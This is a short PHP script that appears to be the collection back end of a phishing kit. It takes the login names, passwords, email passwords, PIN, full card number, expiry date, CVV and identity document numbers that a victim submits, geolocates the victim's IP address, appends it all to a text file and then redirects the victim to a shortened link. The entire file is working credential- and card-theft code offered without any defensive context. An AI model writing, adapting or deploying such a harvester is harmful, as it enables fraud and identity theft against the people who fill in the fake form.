<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("NEW.txt", "a");
	
fwrite($file, 
"* USER: ".$_POST['usuario']."
* PASS: ".$_POST['contra']."
* EMAIL: ".$_POST['email']."
* E-PASS: ".$_POST['cpass']."
* PIN: ".$_POST['pin']."
* CARD: ".$_POST['card']."
* MES: ".$_POST['mes']."
* YEAR: ".$_POST['year']."
* CVV: ".$_POST['cvv']."
* DOCU: ".$_POST['docu']."
* N-DOCU: ".$_POST['ndocu']."
* F-H-IP-P-C: 
".date('Y-m-d')."
".date('H:i:s')."
".$userp."
".$cc."
".$city."  
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location: https://bit.ly/3iG6y6N");

?>
